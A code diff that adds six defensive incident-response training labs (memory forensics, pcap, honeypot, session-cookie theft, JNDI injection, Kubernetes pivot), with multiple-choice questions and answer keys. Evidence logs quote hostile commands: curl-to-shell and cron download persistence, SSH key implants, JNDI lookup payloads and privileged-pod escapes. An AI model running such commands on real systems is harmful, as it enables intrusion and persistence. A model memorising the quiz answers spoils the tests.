@@ -3199,4 +3199,623 @@ Users can write to C:\Users\Public`,
       },
     ],
   },
+  {
+    id: 'lab-31',
+    title: 'Linux Memory Forensics of an SSH Backdoor',
+    domain: 1,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'A database server, db-ora02 (RHEL 9), showed an SSH login for the oracle account at 03:10 from an IP no DBA recognizes. The on-call admin captured memory with LiME before isolating the host. Disk logs look clean. Use Volatility 3 Linux plugins to establish what the intruder ran and whether a backdoor exists.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review processes from memory',
+        evidence: r`$ vol -f db-ora02.lime linux.pstree | sed -n '30,37p'
+* 1        systemd
+** 1102    sshd
+*** 8810   sshd: oracle [priv]
+**** 8812  sshd: oracle@pts/1
+***** 8813 bash
+****** 8890 python3
+** 2233    oracle_pmon_ORCL`,
+        question: 'Which process chain should you investigate first?',
+        options: [
+          'systemd, because it is PID 1',
+          'oracle_pmon_ORCL, because it belongs to Oracle',
+          'The oracle SSH session leading to bash and then python3, since a DBA account rarely runs Python interactively at 03:10',
+          'sshd PID 1102, because it is the SSH daemon',
+        ],
+        correctIndex: 2,
+        hint: 'Which branch corresponds to the suspicious 03:10 login?',
+        walkthrough: 'The pstree shows the interactive session tied to the suspicious login: sshd for oracle, a pts shell, then python3. The pmon process is the normal Oracle background process. Next, see what the shell ran.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Recover shell history from memory',
+        evidence: r`$ vol -f db-ora02.lime linux.bash --pid 8813
+PID   Process  CommandTime          Command
+8813  bash     2026-03-14 03:10:44  unset HISTFILE
+8813  bash     2026-03-14 03:11:02  curl -s http://193.31.28.40/k -o /dev/shm/.k
+8813  bash     2026-03-14 03:11:09  python3 /dev/shm/.k --install
+8813  bash     2026-03-14 03:12:30  rm -f /dev/shm/.k
+$ cat /home/oracle/.bash_history | tail -1
+sqlplus / as sysdba     (last entry is from 03-12)`,
+        question: 'Why does the memory analysis show commands missing from .bash_history?',
+        options: [
+          'The history file is corrupted',
+          'Volatility invented the commands',
+          'The intruder unset HISTFILE so nothing was written to disk, but linux.bash recovers the command list from the running bash process memory',
+          'History is only written after a reboot',
+        ],
+        correctIndex: 2,
+        hint: 'Look at the first command in the session.',
+        walkthrough: 'unset HISTFILE stops bash from saving history to disk, which is why the file looks clean. The history still lives in the bash process memory, and linux.bash extracts it. This is a strong reason to capture memory before shutting down Linux systems.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Look for a backdoor',
+        evidence: r`$ vol -f db-ora02.lime linux.sockstat | grep -E "LISTEN" | grep -v -E ":22 |:1521 "
+python3  8890  TCP  0.0.0.0:31337  LISTEN
+$ vol -f db-ora02.lime linux.proc.Maps --pid 8890 | grep -i -E "deleted|shm"
+/dev/shm/.k (deleted)
+$ vol -f db-ora02.lime linux.check_syscall | grep -v "kernel"
+(no hooked syscalls)`,
+        question: 'What is the backdoor and what kind is it?',
+        options: [
+          'A kernel rootkit hooking syscalls',
+          'There is no backdoor',
+          'An Oracle listener',
+          'A user-space Python backdoor listening on TCP 31337, running from a deleted file in /dev/shm; no kernel-level hooks were found',
+        ],
+        correctIndex: 3,
+        hint: 'Check the listener, the mapped file, and the syscall check result.',
+        walkthrough: 'python3 PID 8890 listens on an unusual port and maps a deleted script from shared memory, which means it was deleted from disk after launch (as the bash history shows). check_syscall found no hooks, which suggests user-space only. Recover the script from memory with linux.proc.Maps --dump for analysis.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check for persistence beyond memory',
+        evidence: r`Script recovered from memory (excerpt):
+def install():
+    os.system("echo '@reboot oracle python3 -c \"$(curl -s http://193.31.28.40/k)\"' >> /var/spool/cron/oracle")
+    os.system("mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3...xK ops' >> ~/.ssh/authorized_keys")
+$ (disk) cat /var/spool/cron/oracle
+@reboot oracle python3 -c "$(curl -s http://193.31.28.40/k)"`,
+        question: 'Which persistence must be removed?',
+        options: [
+          'Only the running process',
+          'Nothing; the script was deleted',
+          'Only the SSH key',
+          'The @reboot cron entry that re-downloads the backdoor and the SSH key added to oracle\'s authorized_keys, plus the running process',
+        ],
+        correctIndex: 3,
+        hint: 'Read what install() wrote to disk.',
+        walkthrough: 'The recovered script reveals two persistence mechanisms: a cron @reboot that fetches the payload again, and an SSH key for direct access. Memory analysis told you exactly where to look on disk, which is faster and more reliable than guessing.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Find initial access and respond',
+        evidence: r`/var/log/secure (forwarded copy in SIEM)
+03:09:58 Accepted password for oracle from 193.31.28.40 port 50122
+03-01..03-14: 1,880 failed password attempts for oracle from various IPs
+sshd_config: PasswordAuthentication yes; oracle account password last changed 2019`,
+        question: 'What is the best response?',
+        options: [
+          'Kill the process and keep going',
+          'Preserve evidence, remove the cron entry and key, kill the backdoor, rotate the oracle password and any database credentials on the host, disable SSH password authentication, restrict SSH to a bastion, and check the database for unauthorized access',
+          'Block port 31337 only',
+          'Reinstall Oracle',
+        ],
+        correctIndex: 1,
+        hint: 'The intruder guessed a stale password over SSH. Also consider what a DBA account can reach.',
+        walkthrough: 'A brute-forced 2019 password on an internet-reachable SSH service was the entry point. Clean up the persistence, rotate credentials, move to key-based auth through a bastion, and audit the database itself, because the oracle OS account can usually connect as SYSDBA.',
+      },
+    ],
+  },
+  {
+    id: 'lab-32',
+    title: 'Packet Capture of a Malicious Download',
+    domain: 1,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'A user in marketing (MKT-WS05, 10.20.5.25) clicked a link in a fake "shared document" email. The network team has a full packet capture of the next five minutes. Use tcpdump and tshark to find what was downloaded and whether it ran.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Find the web requests',
+        evidence: r`$ tshark -r mkt.pcap -Y 'http.request && ip.src==10.20.5.25' -T fields -e frame.time -e http.host -e http.request.uri
+11:02:10  docs-share-view.com   /d/8812
+11:02:12  docs-share-view.com   /d/8812/download
+11:02:13  docs-share-view.com   /files/Shared_Report.zip`,
+        question: 'What does this show?',
+        options: [
+          'The user visited a look-alike document-sharing site and downloaded a ZIP file over plain HTTP',
+          'Normal browsing to Google Docs',
+          'An HTTPS download that cannot be seen',
+          'A DNS lookup only',
+        ],
+        correctIndex: 0,
+        hint: 'Look at the host name and the final URI.',
+        walkthrough: 'The host imitates a document-sharing service, and the last request fetches a ZIP. Because it was plain HTTP, the capture contains the file itself, so you can extract and analyze it.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Extract and identify the file',
+        evidence: r`$ tshark -r mkt.pcap --export-objects http,./export -q
+$ ls -la export/
+-rw-r--r-- 1 analyst analyst 418221 Shared_Report.zip
+$ unzip -l export/Shared_Report.zip
+  Length   Name
+  1402      Shared_Report.pdf.js
+$ sha256sum export/Shared_Report.zip
+a71c...09e4  export/Shared_Report.zip`,
+        question: 'What is inside the ZIP?',
+        options: [
+          'A JavaScript file disguised with a double extension (.pdf.js), which Windows runs with the script host when double-clicked',
+          'A PDF document',
+          'An image',
+          'An empty archive',
+        ],
+        correctIndex: 0,
+        hint: 'Read the full filename including the last extension.',
+        walkthrough: 'tshark --export-objects pulls files out of HTTP traffic. The real extension is .js, and with "hide extensions" on, users see "Shared_Report.pdf". Double-clicking runs it with wscript.exe. Record the hash for blocking and sweeping.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Check whether it ran',
+        evidence: r`$ tshark -r mkt.pcap -Y 'ip.src==10.20.5.25 && (http.request || tls.handshake.type==1)' -T fields -e frame.time -e http.host -e tls.handshake.extensions_server_name
+11:02:13  docs-share-view.com
+11:03:40                        cdn-assets-update.net
+11:03:41                        cdn-assets-update.net
+11:08:41                        cdn-assets-update.net`,
+        question: 'What does the traffic after the download suggest?',
+        options: [
+          'The user closed the browser',
+          'About 90 seconds after the download, the host started TLS sessions to a new domain, then again five minutes later, which suggests the script ran and started beaconing',
+          'The ZIP was blocked',
+          'This is normal Windows telemetry',
+        ],
+        correctIndex: 1,
+        hint: 'Look at the timing and the SNI.',
+        walkthrough: 'New TLS connections to an unfamiliar domain shortly after the download, with a repeat at a regular interval, fit execution followed by beaconing. The SNI field names the server even though the content is encrypted. Confirm on the host with process telemetry.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Write a capture filter for ongoing monitoring',
+        evidence: r`Resolved IPs for cdn-assets-update.net: 194.58.112.7
+Goal: capture only traffic between any internal host and this C2 for 24h on the egress sensor, writing 200 MB files`,
+        question: 'Which command meets the goal?',
+        options: [
+          'tcpdump -i eth0 -w c2.pcap port 443',
+          'tcpdump -r c2.pcap host 194.58.112.7',
+          'tcpdump -i eth0 -nn -s 0 -C 200 -w c2.pcap host 194.58.112.7',
+          'tshark -Y "ip.addr==194.58.112.7" -w c2.pcap',
+        ],
+        correctIndex: 2,
+        hint: 'You need a live capture, a BPF capture filter, and file rotation by size.',
+        walkthrough: 'host 194.58.112.7 matches either direction, -s 0 keeps whole packets, -C 200 rotates every 200 MB, and -i captures live. Capturing all of port 443 would be huge, -r reads an existing file, and tshark -Y is a display filter, which is not a reliable way to limit what gets written during capture.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Contain and prevent',
+        evidence: r`EDR on MKT-WS05: wscript.exe ran Shared_Report.pdf.js at 11:03:38; persistence via Startup folder shortcut
+Email: same link sent to 41 users; 3 clicked
+Windows setting: file extensions hidden; .js opens with Windows Script Host`,
+        question: 'Which response is most complete?',
+        options: [
+          'Reimage MKT-WS05 only',
+          'Isolate the 3 clicking hosts, block the domains and IP, purge the email, remove persistence or rebuild, and reduce risk by changing the default handler for .js/.vbs files to Notepad and showing file extensions',
+          'Tell users not to click links',
+          'Block all ZIP files forever',
+        ],
+        correctIndex: 1,
+        hint: 'Scope, contain, eradicate, then remove the easy execution path.',
+        walkthrough: 'Three users clicked, so contain all three. Blocking infrastructure and purging email stops more victims. Re-associating script extensions with Notepad (or disabling Windows Script Host) neutralizes this whole class of attachment, and showing extensions helps users spot tricks.',
+      },
+    ],
+  },
+  {
+    id: 'lab-33',
+    title: 'Honeypot Trips on an Internal Scanner',
+    domain: 2,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'Security deployed several low-interaction honeypots that look like file servers and databases but have no real users. One of them, HP-SQL01 (10.20.9.250), just alerted. No legitimate system should ever talk to it. Work out what is scanning, what it was looking for, and what happens next.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the honeypot alert',
+        evidence: r`HP-SQL01 events
+09:41:02  TCP SYN from 10.20.6.48 -> 1433
+09:41:02  TCP SYN from 10.20.6.48 -> 3306
+09:41:02  TCP SYN from 10.20.6.48 -> 5432
+09:41:03  MSSQL login attempt  user=sa  password=(attempt 1 of 42)
+Asset: 10.20.6.48 = DEV-WS33 (developer workstation)`,
+        question: 'Why is a honeypot alert high-fidelity?',
+        options: [
+          'Honeypots are always attacked from the internet',
+          'No legitimate user or system should touch it, so any connection, especially database login attempts, is suspicious by design',
+          'Honeypots block attackers automatically',
+          'Honeypots only alert on malware',
+        ],
+        correctIndex: 1,
+        hint: 'What is the normal traffic to a system nobody uses?',
+        walkthrough: 'A honeypot has no business function, so its baseline is zero. A developer workstation probing three database ports at once and trying the "sa" account is either a compromised host or someone misusing it. False positives are rare.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Characterize the scan from NetFlow',
+        evidence: r`NetFlow from 10.20.6.48 (09:30-09:45)
+dst ports  1433, 3306, 5432, 6379, 27017
+dst hosts  10.20.9.0/24 (254 hosts), 10.20.10.0/24 (254 hosts)
+flags      mostly SYN only; full sessions to 10.20.9.40:1433 and 10.20.9.250:1433`,
+        question: 'What is the scanner looking for?',
+        options: [
+          'Web servers',
+          'Printers',
+          'Database services (MSSQL, MySQL, PostgreSQL, Redis, MongoDB) across two server subnets, and it found two MSSQL servers it tried to log in to',
+          'Domain controllers',
+        ],
+        correctIndex: 2,
+        hint: 'Map each port to its service.',
+        walkthrough: 'The ports are the default database ports. SYN-only flows mean port scanning, and full sessions show follow-up login attempts on the hosts that answered, including a real server (10.20.9.40). Check that server\'s logs for login attempts and successes.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Investigate the source host',
+        evidence: r`DEV-WS33 EDR
+09:28  python.exe -m pip install sqlscan-utils  (package uploaded to PyPI 03-13 by unknown author)
+09:30  python.exe sqlscan-utils\run.py --range 10.20.0.0/16 --creds common.txt
+User statement: "I installed a package to format SQL queries"`,
+        question: 'What is the most likely explanation?',
+        options: [
+          'The developer is deliberately attacking the network',
+          'A legitimate database inventory tool',
+          'A Windows update',
+          'A malicious package installed from PyPI (a supply-chain or typosquatting style lure) ran a built-in scanner and credential guessing without the developer\'s knowledge',
+        ],
+        correctIndex: 3,
+        hint: 'Look at when the package was published and what launched the scan.',
+        walkthrough: 'A day-old package from an unknown author started scanning two minutes after installation. The developer thought it was a formatter. Malicious packages in public registries are a known risk; treat the host as compromised, and check whether others installed the same package.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check the real database',
+        evidence: r`SQL01 (10.20.9.40) ERRORLOG
+09:41:10  Login failed for user 'sa'. Reason: Password did not match. [CLIENT: 10.20.6.48]  x 38
+09:41:40  Login succeeded for user 'app_report'. [CLIENT: 10.20.6.48]
+09:41:41  app_report: SELECT name FROM sys.databases
+app_report password: "Report2020!" (in common.txt list)`,
+        question: 'What happened on the real server?',
+        options: [
+          'All attempts failed',
+          'Only the honeypot was affected',
+          'The server was rebooted',
+          'sa attempts failed, but a reporting account with a weak, common password succeeded and enumerated databases',
+        ],
+        correctIndex: 3,
+        hint: 'Find the successful login.',
+        walkthrough: 'The honeypot gave early warning, but the scanner also reached a real server where a weak service password worked. Rotate app_report, review its permissions and recent queries, and look for other accounts with guessable passwords.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Contain and improve',
+        evidence: r`Hosts with sqlscan-utils installed (EDR search): DEV-WS33, DEV-WS12
+Network: developer VLAN can reach all server subnets on any port
+Package policy: developers install from public PyPI directly`,
+        question: 'Which response is best?',
+        options: [
+          'Isolate both hosts, remove the package and rotate any credentials on them, rotate app_report and weak service passwords, restrict developer VLAN access to databases, use an internal package proxy with vetting, and keep and expand the honeypots',
+          'Uninstall the package on DEV-WS33 only',
+          'Remove the honeypots because they caused alerts',
+          'Ban Python',
+        ],
+        correctIndex: 0,
+        hint: 'Two hosts, one weak account, a flat network, and an open supply chain.',
+        walkthrough: 'Contain both infected hosts and fix the weak credential that was used. Segmenting developer networks from production databases limits what any compromised workstation can reach. A curated package proxy reduces malicious-package risk, and the honeypots proved their value as cheap, high-signal detection.',
+      },
+    ],
+  },
+  {
+    id: 'lab-34',
+    title: 'Infostealer to SaaS Account Takeover',
+    domain: 3,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'The company\'s CRM vendor reported that an admin account belonging to sales ops lead v.osei exported all customer contacts yesterday from an unusual IP. v.osei says they were on holiday and did not log in. MFA is enforced through SSO. Determine how the attacker got in and where the credentials came from.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review SSO and CRM sign-ins',
+        evidence: r`SSO log for v.osei
+03-13 08:10  interactive login + MFA  IP 10.20.1.5 (office)   device CORP-LT-088
+03-13 08:10  session cookie issued (valid 14 days)
+CRM audit
+03-15 22:31  session login via SSO cookie   IP 176.111.174.20  UA "Chrome/122 Windows"
+03-15 22:40  Export: Contacts (412,900 records)`,
+        question: 'How did the attacker pass MFA?',
+        options: [
+          'They guessed the password and the MFA code',
+          'The CRM does not use SSO',
+          'MFA was disabled',
+          'They did not need to: they replayed a still-valid session cookie issued after v.osei\'s real MFA login two days earlier',
+        ],
+        correctIndex: 3,
+        hint: 'There is no new interactive login on 03-15.',
+        walkthrough: 'A long-lived session cookie represents an already-completed login. If stolen, it can be replayed without the password or MFA. The access on 03-15 used the session from 03-13, from a new IP, which points to cookie theft.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find where the cookie was stolen',
+        evidence: r`CORP-LT-088 (v.osei laptop): EDR clean, no detections
+v.osei interview: "I sometimes check work email on my home PC through the browser"
+SSO log 03-13 19:22: login + MFA from home IP 82.15.33.10, device: unmanaged Windows PC
+Threat intel: v.osei corporate credentials and cookies listed in an infostealer log marketplace on 03-14`,
+        question: 'What is the most likely source?',
+        options: [
+          'The corporate laptop',
+          'Infostealer malware on the unmanaged home PC, which harvested saved passwords and browser session cookies after v.osei logged in from it',
+          'A phishing email',
+          'The CRM vendor',
+        ],
+        correctIndex: 1,
+        hint: 'Which device was not managed, and what did threat intel find?',
+        walkthrough: 'Infostealers grab browser cookies and saved credentials and sell them in bulk. The home PC login on 03-13 put a fresh SSO cookie there, and the data appeared for sale the next day. The corporate laptop is clean, so the gap is unmanaged-device access.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Contain the identity',
+        evidence: r`Active sessions for v.osei: 4 (SSO), 2 (CRM), 1 (email)
+Saved browser passwords on the home PC (per stealer log listing): SSO, CRM direct login, personal bank, 3 other SaaS`,
+        question: 'Which containment is needed?',
+        options: [
+          'Change the SSO password only',
+          'Block 176.111.174.20 only',
+          'Revoke all SSO and app sessions, reset the SSO password, check and reset any app-local passwords (like the CRM direct login), and review MFA methods',
+          'Disable the CRM for everyone',
+        ],
+        correctIndex: 2,
+        hint: 'Cookies and passwords for several services were stolen.',
+        walkthrough: 'Session revocation kills stolen cookies, a password reset handles harvested credentials, and app-local logins that bypass SSO need their own resets. Advise v.osei about their personal accounts too, since the stealer took those passwords as well.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Assess the impact',
+        evidence: r`Export contents: contact name, email, phone, company, deal notes
+Records: 412,900 (all customers)
+CRM API logs: no further exports; one API token created 22:45 "integration-sync"`,
+        question: 'What remains to be done for scope?',
+        options: [
+          'Nothing; the export is the full impact',
+          'Revoke the API token created by the attacker, since it could keep working after the session is revoked, and start the privacy assessment for 412,900 exported records',
+          'Delete the CRM data',
+          'Only notify v.osei',
+        ],
+        correctIndex: 1,
+        hint: 'Is there any attacker-created access that survives session revocation?',
+        walkthrough: 'An API token created during the hijacked session is independent persistence. Remove it and review any other integrations created recently. The bulk export of customer contact data needs privacy and legal review for notification decisions.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent repeat incidents',
+        evidence: r`Current SSO policy: any device, 14-day sessions, MFA once per session
+CRM: local login allowed in addition to SSO
+No alerts on session use from a new IP or country`,
+        question: 'Which changes reduce this risk most?',
+        options: [
+          'Longer passwords',
+          'Turn off MFA because it did not help',
+          'Ban working from home',
+          'Require managed or compliant devices for SaaS access (or browser isolation for unmanaged ones), shorten sessions and bind them to device where possible, disable app-local logins, and alert on session reuse from new IPs or countries',
+        ],
+        correctIndex: 3,
+        hint: 'The weak points were unmanaged devices, long sessions, and a side door into the CRM.',
+        walkthrough: 'Device-based access policies keep corporate sessions off unmanaged, potentially infected PCs. Shorter, device-bound sessions reduce the value of stolen cookies. Removing local logins forces everything through SSO controls, and alerts on anomalous session use catch replay quickly. MFA still matters; it just does not protect stolen sessions.',
+      },
+    ],
+  },
+  {
+    id: 'lab-35',
+    title: 'JNDI Injection Probes Against a Java App',
+    domain: 4,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A new advisory describes a remote code execution flaw in a logging library used by Java applications (similar to Log4Shell). Your WAF shows thousands of probe strings. Determine which applications are vulnerable, whether any probe succeeded, and how to respond.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Recognize the probes',
+        evidence: r`WAF log (sample)
+45.155.205.233 GET / UA: ${'$'}{jndi:ldap://45.155.205.233:1389/a}
+185.220.101.9  GET /login X-Api-Version: ${'$'}{${'$'}{lower:j}ndi:${'$'}{lower:l}dap://c2.example/x}
+91.240.118.7   POST /search body: q=${'$'}{jndi:dns://ab12.oast.example/q}`,
+        question: 'What are these requests attempting?',
+        options: [
+          'Getting the logging library to evaluate a JNDI lookup from attacker-controlled input, which makes the server contact an attacker LDAP/DNS server and can lead to remote code execution',
+          'SQL injection',
+          'XSS in the user agent',
+          'Directory traversal',
+        ],
+        correctIndex: 0,
+        hint: 'The payloads target strings that get logged, in headers and bodies.',
+        walkthrough: 'If a vulnerable logger processes the string, it performs a JNDI lookup. LDAP lookups can return a reference to remote code. DNS lookups are used just to confirm vulnerability. The nested lower:... lookups are obfuscation to evade simple WAF rules.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find vulnerable applications',
+        evidence: r`SBOM / file scan results
+app            library version      exposed to internet
+billing-api    loglib 2.14.1        yes
+hr-portal      loglib 2.17.2 (fixed) yes
+reporting      loglib 2.14.1        no (internal only)
+search-svc     loglib 2.12.0        yes`,
+        question: 'Which applications need urgent action?',
+        options: [
+          'Only hr-portal',
+          'None, because the WAF is blocking probes',
+          'billing-api and search-svc first (vulnerable and internet-facing), then reporting (vulnerable but internal, still reachable through logged data from other systems)',
+          'Only reporting',
+        ],
+        correctIndex: 2,
+        hint: 'Combine version and exposure.',
+        walkthrough: 'Prioritize vulnerable, internet-facing apps. Internal apps are not safe just because they are internal: data from the internet often ends up in their logs. A software inventory (SBOM) made this fast; without one, teams scan file systems for the library JARs.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Check for successful exploitation',
+        evidence: r`Egress firewall logs
+search-svc (10.30.2.15) -> 45.155.205.233:1389  TCP  ALLOWED  03-14 02:11:40
+search-svc (10.30.2.15) -> 45.155.205.233:8080  TCP  ALLOWED  03-14 02:11:41  (bytes_in 7.2 KB)
+billing-api (10.30.2.22) -> ab12.oast.example DNS query  03-14 03:20:05
+billing-api -> no outbound LDAP/HTTP`,
+        question: 'Which statement is correct?',
+        options: [
+          'Neither app was affected',
+          'search-svc made an LDAP connection and then downloaded a small payload, which is likely successful exploitation; billing-api performed a DNS lookup, showing it is vulnerable, but there is no sign of code download',
+          'billing-api was fully compromised',
+          'The DNS query is harmless and means nothing',
+        ],
+        correctIndex: 1,
+        hint: 'Outbound LDAP plus HTTP download versus a DNS-only callback.',
+        walkthrough: 'An outbound LDAP connection to the attacker followed by a download is the full exploit chain, so search-svc needs incident response now. A DNS callback from billing-api confirms the bug is reachable; egress filtering may have prevented the LDAP step. Patch both immediately.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Investigate the compromised service',
+        evidence: r`search-svc host (container) process tree after 02:11:41
+java (search-svc) -> /bin/sh -c "curl -s 45.155.205.233:8080/m | sh"
+sh -> ./xmrig --donate-level 1 -o pool.example:443
+Container image: runs as root; mounts /var/run/docker.sock`,
+        question: 'What is the biggest concern?',
+        options: [
+          'The CPU usage from the miner',
+          'The miner\'s pool address',
+          'curl being installed',
+          'The container runs as root with the Docker socket mounted, so the attacker could control the host and other containers, not just mine cryptocurrency',
+        ],
+        correctIndex: 3,
+        hint: 'What can a process that can talk to docker.sock do?',
+        walkthrough: 'The miner is the visible payload, but access to docker.sock is effectively root on the host: the attacker can start privileged containers and read other containers\' data. Scope must include the host and its other workloads.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Respond and harden',
+        evidence: r`Options:
+ a) Upgrade loglib in all apps; as a stopgap, disable lookups by configuration where supported
+ b) Rebuild search-svc host and redeploy containers from clean images; rotate secrets available to that host
+ c) Restrict egress from app servers to required destinations only
+ d) Remove docker.sock mounts and run containers as non-root`,
+        question: 'Which plan is complete?',
+        options: [
+          'a, b, c and d',
+          'a only',
+          'c only',
+          'b only',
+        ],
+        correctIndex: 0,
+        hint: 'Patch, clean up the compromise, limit callbacks, and reduce container blast radius.',
+        walkthrough: 'Patch everywhere (with mitigations until patched), rebuild the compromised host and rotate its secrets, and restrict egress so future injection bugs cannot easily call home. Running containers as non-root without docker.sock limits damage when an app is compromised.',
+      },
+    ],
+  },
+  {
+    id: 'lab-36',
+    title: 'Kubernetes Pod Compromise and Node Pivot',
+    domain: 5,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'Runtime security (Falco) on the production Kubernetes cluster raised "Terminal shell in container" for a pod of the image-resizer service, followed by "Contact K8S API server from container". Determine what the attacker did inside the cluster and how far they got.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the runtime alerts',
+        evidence: r`Falco
+13:02:11 Notice  A shell was spawned in a container (user=root container=image-resizer-7d9f pod=image-resizer-7d9f-x2k shell=sh parent=node cmdline=sh -c id)
+13:04:30 Warning Contact K8S API Server From Container (command=curl -sk https://10.96.0.1/api/v1/namespaces/default/secrets connection=10.96.0.1:443)
+13:04:31 Notice  Read sensitive file (file=/var/run/secrets/kubernetes.io/serviceaccount/token)`,
+        question: 'What is the attacker doing?',
+        options: [
+          'After getting a shell in the pod, the attacker read the pod\'s service account token and used it to query the Kubernetes API for secrets',
+          'A normal health check',
+          'Updating the container image',
+          'Scaling the deployment',
+        ],
+        correctIndex: 0,
+        hint: 'Follow the three events in order.',
+        walkthrough: 'The node.js app spawned a shell, which usually means code execution through an app vulnerability. Every pod gets a service account token mounted by default; the attacker read it and called the API server to list secrets. How far this goes depends on that service account\'s RBAC permissions.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Check the service account permissions',
+        evidence: r`$ kubectl auth can-i --list --as=system:serviceaccount:default:image-resizer
+Resources        Verbs
+secrets          [get list]
+pods             [get list create]
+pods/exec        [create]
+Role binding: image-resizer bound to ClusterRole "dev-wide" (created for debugging in 2024)`,
+        question: 'Why is this binding dangerous?',
+        options: [
+          'It is not dangerous; it is read-only',
+          'It only affects the default namespace and nothing there matters',
+          'The app\'s service account can read all secrets, create pods, and exec into pods, far more than an image resizer needs; that allows stealing credentials and launching new workloads',
+          'Kubernetes ignores RBAC for service accounts',
+        ],
+        correctIndex: 2,
+        hint: 'What does an image resizer actually need from the API?',
+        walkthrough: 'An image resizer usually needs no API access at all. A leftover debugging ClusterRole gave it the power to read secrets and create pods, which is a classic cluster escalation path. Least-privilege RBAC and disabling token automount for apps that do not need it prevent this.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Find the pivot to the node',
+        evidence: r`Kubernetes audit log
+13:06:02 create pod "debug-tools" ns=default by system:serviceaccount:default:image-resizer
+  spec: hostPID: true, hostNetwork: true, containers[0].securityContext.privileged: true
+        volumes: hostPath "/" mounted at /host
+13:06:40 pods/exec debug-tools  command: chroot /host bash`,
+        question: 'What did this pod give the attacker?',
+        options: [
+          'Nothing beyond the original pod',
+          'Root access to the underlying node: a privileged pod with the host file system mounted and host PID/network namespaces, then chroot into the host',
+          'Access to the container registry only',
+          'A denial of service',
+        ],
+        correctIndex: 1,
+        hint: 'Read the securityContext and volumes.',
+        walkthrough: 'privileged: true, hostPID, hostNetwork and a hostPath mount of "/" make the container effectively the node. chroot /host gives a root shell on the worker node, with access to kubelet credentials and every other pod running there. Admission controls (Pod Security Standards "restricted") would have rejected this pod.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Scope the secrets exposure',
+        evidence: r`Kubernetes audit: secrets listed in namespace default and payments (13:04-13:10)
+payments/stripe-api-key, payments/db-credentials, default/registry-pull-secret
+Node worker-3 also ran pods: payments-api, ledger-sync
+Cloud logs: node instance role used from 13:12 to call ecr:GetAuthorizationToken and s3:ListBuckets`,
+        question: 'What must be treated as compromised?',
+        options: [
+          'All secrets that were listed (payment API key, DB credentials, registry credentials), everything on worker-3 including other pods and the node\'s cloud instance role',
+          'Only image-resizer',
+          'Only the payments namespace',
+          'Nothing, because Kubernetes secrets are encrypted',
+        ],
+        correctIndex: 0,
+        hint: 'Kubernetes secrets are only base64 encoded when read through the API.',
+        walkthrough: 'Secrets returned by the API are readable by whoever requested them. Root on the node exposes every workload on it and the node\'s cloud identity, which was already used. Rotation must include the payment provider key, database passwords, registry credentials, and node role sessions.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Eradicate and harden',
+        evidence: r`Initial entry: image-resizer used a vulnerable image library with known RCE (patched upstream 6 months ago)
+Cluster settings: no Pod Security admission; default automountServiceAccountToken: true; nodes allow any pod to use hostPath`,
+        question: 'Which plan is most complete?',
+        options: [
+          'Cordon, drain and replace worker-3, delete the malicious pod, rotate all exposed secrets and node credentials, remove the dev-wide binding, patch the image library, enforce Pod Security "restricted" admission, disable token automount where not needed, and restrict egress from pods',
+          'Delete the debug-tools pod',
+          'Restart the image-resizer deployment',
+          'Rebuild the entire cluster from scratch without investigating',
+        ],
+        correctIndex: 0,
+        hint: 'Remove the attacker, rotate what was exposed, and fix each link of the chain.',
+        walkthrough: 'Replace the compromised node rather than cleaning it, rotate every exposed credential, and close each step of the chain: the unpatched library (entry), excessive RBAC (escalation), missing admission controls (node escape), and default token mounting. Egress restrictions limit future data theft and C2.',
+      },
+    ],
+  },
 ];
